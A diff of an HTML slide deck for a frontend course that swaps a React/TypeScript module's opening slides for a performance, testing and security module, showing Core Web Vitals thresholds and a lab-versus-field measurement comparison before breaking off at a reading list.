@@ -6,7 +6,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Module 06 — React + TypeScript in Production · Frontend Mastery</title>
+<title>Module 08 — Performance, Testing &amp; Security · Frontend Mastery</title>
 <style>
   :root{
     --bg:#070A14; --panel:#0E1525; --panel2:#121C30; --code:#0B1220;
@@ -82,6 +82,8 @@
   .plist li{font:600 min(2vw,22px)/1.35 var(--sans); color:var(--ink); padding:9px 0 9px 32px; position:relative}
   .plist li::before{content:"▷"; position:absolute; left:0; top:11px; color:var(--cy); font-size:15px}
   .plist li small{display:block; color:var(--muted); font-weight:400; font-size:.72em; margin-top:3px}
+  .plist a{color:inherit; text-decoration:none; border-bottom:1px solid var(--line2)}
+  .plist a:hover{color:var(--cy); border-color:var(--cy)}
 
   table.grid{border-collapse:collapse; width:100%; max-width:1040px; margin-top:20px; font-size:min(1.6vw,17.5px)}
   table.grid th{text-align:left; font:700 12px/1 var(--mono); letter-spacing:1.4px; text-transform:uppercase; color:var(--muted); padding:10px 12px; border-bottom:2px solid var(--line2)}
@@ -188,11 +190,6 @@
     .frag{opacity:1 !important; transform:none !important}
     *{animation:none !important}
   }
-
-  /* Read-next slides: links a presenter can click without advancing the deck. */
-  .refs li a{color:var(--ink); text-decoration:underline; text-decoration-color:var(--cy);
-    text-decoration-thickness:2px; text-underline-offset:4px}
-  .refs li a:hover, .refs li a:focus-visible{color:var(--cy)}
 </style>
 <!--catalyst-brand:style-->
 <link rel="icon" type="image/png" href="data:image/png;base64,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">
@@ -285,467 +282,646 @@
 
 <div id="bar"></div>
 <div id="stage">
-<!-- 1 · TITLE -->
-  <section class="slide" style="justify-content:center" data-chip="MODULE 06 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 1</div><div class="cx-page"><b>01</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Module 06 · React + TypeScript in Production</div>
-    <h1>Components a Reviewer<br>Can Read</h1>
-    <div class="sub">Typed props, typed events, and state machines instead of boolean soup.</div>
+  <section class="slide" style="justify-content:center" data-chip="MODULE 08 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 1</div><div class="cx-page"><b>01</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Module 08 · Performance, Testing &amp; Security</div>
+    <h1>A Number Before,<br>a Number After</h1>
+    <div class="sub">Measure what users feel, fix it, prove it — then let tests and CI keep it fixed.</div>
     <div class="fig" style="max-width:980px">
-      <svg viewBox="0 0 980 70" role="img" aria-label="Four lessons: the component contract, generic and polymorphic components, hooks and reducers, the typed API layer build">
-        <g>
-          <rect x="0" y="16" width="230" height="38" rx="9" fill="#121C30" stroke="#22D3EE"/>
-          <text x="115" y="40" text-anchor="middle" class="lbl b" font-size="12">1 · The component contract</text>
-          <rect x="250" y="16" width="230" height="38" rx="9" fill="#121C30" stroke="#34D399"/>
-          <text x="365" y="40" text-anchor="middle" class="lbl b" font-size="12">2 · Generic &amp; polymorphic</text>
-          <rect x="500" y="16" width="230" height="38" rx="9" fill="#121C30" stroke="#2196F3"/>
-          <text x="615" y="40" text-anchor="middle" class="lbl b" font-size="12">3 · Hooks &amp; reducers</text>
-          <rect x="750" y="16" width="230" height="38" rx="9" fill="#121C30" stroke="#FBBF24"/>
-          <text x="865" y="40" text-anchor="middle" class="lbl b" font-size="12">4 · Typed API · Build</text>
-        </g>
+      <svg viewBox="0 0 980 124" role="img" aria-label="Six lessons: Core Web Vitals and measuring, bundles images and fonts, memoization and the profiler, testing with Testing Library MSW and Playwright, XSS CSRF and CSP, and the performance budget build">
+        <rect x="0" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
+        <text x="155" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">1 · Core Web Vitals, lab vs field</text>
+        <rect x="335" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
+        <text x="490" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">2 · Bundles, images, fonts</text>
+        <rect x="670" y="6" width="310" height="50" rx="9" fill="#121C30" stroke="#22D3EE"/>
+        <text x="825" y="36" text-anchor="middle" class="lbl b" style="font-size:13px">3 · Memo &amp; the profiler</text>
+        <rect x="0" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#34D399"/>
+        <text x="155" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">4 · Testing Library, MSW, Playwright</text>
+        <rect x="335" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#F8717A"/>
+        <text x="490" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">5 · XSS, CSRF, CSP</text>
+        <rect x="670" y="68" width="310" height="50" rx="9" fill="#121C30" stroke="#FBBF24"/>
+        <text x="825" y="98" text-anchor="middle" class="lbl b" style="font-size:13px">6 · Budget in CI · build</text>
       </svg>
     </div>
 </section>
 
-  <section class="slide" data-chip="MODULE 06 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 1</div><div class="cx-page"><b>02</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 1 · Typing props and children</div>
-    <h2>Extend the element, add only what's yours</h2>
-    <div class="two tight" style="max-width:none">
-      <div class="card r">
-        <h3 class="r">Hand-listed props</h3>
-        <pre><code><span class="kw">type</span> <span class="ty">ButtonProps</span> = {
-  label: <span class="ty">string</span>;
-  onClick: () =&gt; <span class="ty">void</span>;
-  disabled?: <span class="ty">boolean</span>;
-};
-<span class="no">// type="submit"? aria-label? form? — one PR each</span></code></pre>
-      </div>
-      <div class="card g">
-        <h3 class="g">The native contract, plus yours</h3>
-        <pre><code><span class="kw">type</span> <span class="ty">ButtonProps</span> = <span class="ty">ComponentProps</span>&lt;<span class="st">'button'</span>&gt; &amp; {
-  variant?: <span class="st">'primary'</span> | <span class="st">'ghost'</span>;
-  icon?: <span class="ty">ReactNode</span>;
-};
-<span class="ok">// every native attribute, typed — children and ref too</span></code></pre>
-      </div>
-    </div>
-    <pre style="max-width:none"><code><span class="kw">function</span> <span class="fn">Button</span>({ variant = <span class="st">'primary'</span>, icon, children, ...rest }: <span class="ty">ButtonProps</span>) {
-  <span class="kw">return</span> &lt;<span class="kw">button</span> {...rest} data-variant={variant}&gt;{icon}{children}&lt;/<span class="kw">button</span>&gt;;
-}
+  <!-- L1a · CORE WEB VITALS -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 1</div><div class="cx-page"><b>02</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 1 · Core Web Vitals</div>
+    <h2>Three numbers for what users feel</h2>
+    <div class="fig" style="max-width:1000px">
+      <svg viewBox="0 0 1000 204" role="img" aria-label="Thresholds: LCP good up to 2.5 seconds, poor above 4 seconds; INP good up to 200 milliseconds, poor above 500; CLS good up to 0.1, poor above 0.25">
+        <text x="0" y="36" class="lbl b" style="font-size:19px">LCP · loading</text>
+        <text x="0" y="56" class="lbl" style="font-size:13px">when the biggest element has painted</text>
+        <rect x="300" y="24" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
+        <rect x="580" y="24" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+        <rect x="800" y="24" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
+        <text x="440" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
+        <text x="690" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
+        <text x="900" y="44" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
+        <text x="580" y="17" text-anchor="middle" class="lbl b" style="font-size:14px">2.5 s</text>
+        <text x="800" y="17" text-anchor="middle" class="lbl b" style="font-size:14px">4 s</text>
 
-&lt;<span class="ty">Button</span> type=<span class="st">"submit"</span> disabled={saving} aria-label=<span class="st">"Apply to this listing"</span>&gt;Apply&lt;/<span class="ty">Button</span>&gt;</code></pre>
-    <div class="key"><code>children</code> is a <code>ReactNode</code> — anything React can render. Declare it yourself only when the component wraps no element.</div>
+        <text x="0" y="106" class="lbl b" style="font-size:19px">INP · responsiveness</text>
+        <text x="0" y="126" class="lbl" style="font-size:13px">tap or key press → the next frame</text>
+        <rect x="300" y="94" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
+        <rect x="580" y="94" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+        <rect x="800" y="94" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
+        <text x="440" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
+        <text x="690" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
+        <text x="900" y="114" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
+        <text x="580" y="87" text-anchor="middle" class="lbl b" style="font-size:14px">200 ms</text>
+        <text x="800" y="87" text-anchor="middle" class="lbl b" style="font-size:14px">500 ms</text>
+
+        <text x="0" y="176" class="lbl b" style="font-size:19px">CLS · stability</text>
+        <text x="0" y="196" class="lbl" style="font-size:13px">how far the page jumps, unasked</text>
+        <rect x="300" y="164" width="280" height="30" fill="#34D399" fill-opacity=".16" stroke="#34D399"/>
+        <rect x="580" y="164" width="220" height="30" fill="#FBBF24" fill-opacity=".14" stroke="#FBBF24"/>
+        <rect x="800" y="164" width="200" height="30" fill="#F8717A" fill-opacity=".14" stroke="#F8717A"/>
+        <text x="440" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#34D399">good</text>
+        <text x="690" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#FBBF24">needs improvement</text>
+        <text x="900" y="184" text-anchor="middle" class="lbl" style="font-size:13px; fill:#F8717A">poor</text>
+        <text x="580" y="157" text-anchor="middle" class="lbl b" style="font-size:14px">0.1</text>
+        <text x="800" y="157" text-anchor="middle" class="lbl b" style="font-size:14px">0.25</text>
+      </svg>
+    </div>
+    <div class="key">Each one is scored at the <b>75th percentile</b> of real visits, phones and desktops separately. Pass all three at p75 and the page passes — which still allows one visit in four to be slower than that.</div>
 </section>
 
-  <section class="slide" data-chip="MODULE 06 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 1</div><div class="cx-page"><b>03</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 1 · Typing refs</div>
-    <h2>A ref is typed by the element it holds</h2>
-    <div class="two tight" style="max-width:none">
-      <div class="card w">
-        <h3 class="w">React 18 · forwardRef</h3>
-        <pre><code><span class="kw">const</span> <span class="ty">TextField</span> = <span class="fn">forwardRef</span>&lt;<span class="ty">HTMLInputElement</span>, <span class="ty">FieldProps</span>&gt;(
-  <span class="kw">function</span> <span class="fn">TextField</span>({ label, ...rest }, ref) {
-    <span class="kw">return</span> &lt;<span class="kw">label</span>&gt;{label}&lt;<span class="kw">input</span> ref={ref} {...rest} /&gt;&lt;/<span class="kw">label</span>&gt;;
-  },
-);</code></pre>
-      </div>
-      <div class="card g">
-        <h3 class="g">React 19 · ref is just a prop</h3>
-        <pre><code><span class="kw">type</span> <span class="ty">FieldProps</span> = <span class="ty">ComponentProps</span>&lt;<span class="st">'input'</span>&gt; &amp; { label: <span class="ty">string</span> };
-
-<span class="kw">function</span> <span class="fn">TextField</span>({ label, ...rest }: <span class="ty">FieldProps</span>) {
-  <span class="kw">return</span> &lt;<span class="kw">label</span>&gt;{label}&lt;<span class="kw">input</span> {...rest} /&gt;&lt;/<span class="kw">label</span>&gt;;
-} <span class="ok">// ref arrives in rest — nothing to forward</span></code></pre>
-      </div>
-    </div>
-    <pre style="max-width:none"><code><span class="kw">const</span> inputRef = <span class="fn">useRef</span>&lt;<span class="ty">HTMLInputElement</span>&gt;(<span class="kw">null</span>);        <span class="cmt">// RefObject&lt;HTMLInputElement | null&gt;</span>
-<span class="fn">useEffect</span>(() =&gt; { inputRef.current?.<span class="fn">focus</span>(); }, []);    <span class="cmt">// null until React attaches it</span>
-<span class="kw">return</span> &lt;<span class="ty">TextField</span> ref={inputRef} label=<span class="st">"Search listings"</span> /&gt;;</code></pre>
-    <div class="key w">Type the ref by the DOM element, start it at <code>null</code>, read it with <code>?.</code>. React fills <code>.current</code> after the commit and clears it on unmount — the type says so, so believe it.</div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 1</div><div class="cx-page"><b>04</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 1 · Typing events</div>
-    <h2>Inline handlers type themselves</h2>
-    <div class="two tight" style="max-width:none">
-      <div class="card g">
-        <h3 class="g">Inline · inferred from the prop</h3>
-        <pre><code>&lt;<span class="kw">input</span>
-  value={query}
-  onChange={(e) =&gt; <span class="fn">setQuery</span>(e.target.value)}
-/&gt;
-<span class="ok">// hover e → ChangeEvent&lt;HTMLInputElement&gt;</span></code></pre>
-      </div>
-      <div class="card a">
-        <h3 class="cy">Extracted · name the event once</h3>
-        <pre><code><span class="kw">import type</span> { <span class="ty">ChangeEvent</span>, <span class="ty">SubmitEvent</span> } <span class="kw">from</span> <span class="st">'react'</span>;
-<span class="kw">function</span> <span class="fn">handleSubmit</span>(e: <span class="ty">SubmitEvent</span>&lt;<span class="ty">HTMLFormElement</span>&gt;) {
-  e.<span class="fn">preventDefault</span>();
-  <span class="fn">search</span>(query);
-}</code></pre>
-      </div>
-    </div>
-    <table class="grid" style="max-width:none">
-      <tr><th>Prop</th><th>Event type, when you extract the handler</th><th>What the type buys you</th></tr>
-      <tr><td><code>onChange</code> on an input</td><td><code>ChangeEvent&lt;HTMLInputElement&gt;</code></td><td><code>e.target.value</code> is a <b>string</b>, no cast</td></tr>
-      <tr><td><code>onSubmit</code> on a form</td><td><code>SubmitEvent&lt;HTMLFormElement&gt;</code></td><td>Replaces <code>FormEvent</code>, now deprecated in <code>@types/react</code></td></tr>
-      <tr><td><code>onKeyDown</code> on an input</td><td><code>KeyboardEvent&lt;HTMLInputElement&gt;</code></td><td><code>e.key</code>, <code>e.shiftKey</code> — typed</td></tr>
+  <!-- L1b · LAB VS FIELD -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 1</div><div class="cx-page"><b>03</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 1 · Lab vs field</div>
+    <h2>The lab says why. The field says whether.</h2>
+    <table class="grid">
+      <tr><th>Tool</th><th>Data</th><th>Answers</th><th>Can't tell you</th></tr>
+      <tr><td><b>Lighthouse</b>, Performance panel</td><td><b style="color:var(--cy)">Lab.</b> One load, one machine, simulated slow 4G and 4× CPU slowdown.</td><td>Why it's slow: the waterfall, long tasks, which element is the LCP.</td><td>INP. Nobody clicks in a lab run, so it reports Total Blocking Time instead.</td></tr>
+      <tr><td><b>CrUX</b>, via PageSpeed Insights</td><td><b style="color:var(--good)">Field.</b> Real Chrome users, a rolling 28 days, p75.</td><td>Do our users pass? The verdict that counts.</td><td>Why, or what changed this week. Low-traffic pages get no data.</td></tr>
+      <tr><td><b>RUM</b>, <code>web-vitals</code> in Rasmi</td><td><b style="color:var(--good)">Field.</b> Every visit you choose to send.</td><td>Which page, device, element and release.</td><td>Nothing for free. You build the pipeline and the sampling.</td></tr>
     </table>
-    <div class="key g" style="max-width:none">Your own component's events carry domain values: <code>onApply(listingId)</code>, never <code>onApply(e)</code>.</div>
+    <div class="key w">A Lighthouse 98 on your laptop next to a failing CrUX p75 is not a contradiction. Use the lab to diagnose and the field to judge.</div>
 </section>
 
-  <section class="slide" data-chip="MODULE 06 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 1</div><div class="cx-page"><b>05</b> / 18</div><!--/catalyst-brand:chrome-->
+  <!-- L1 · READ NEXT -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 1"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 1</div><div class="cx-page"><b>04</b> / 23</div><!--/catalyst-brand:chrome-->
     <div class="kicker">Lesson 1 · Read next</div>
-    <h2>The component contract, at the source</h2>
+    <h2>Go deeper: Core Web Vitals</h2>
     <div class="two">
       <div class="card a">
         <h3 class="cy">References</h3>
-        <ul class="plist refs" style="margin-top:4px">
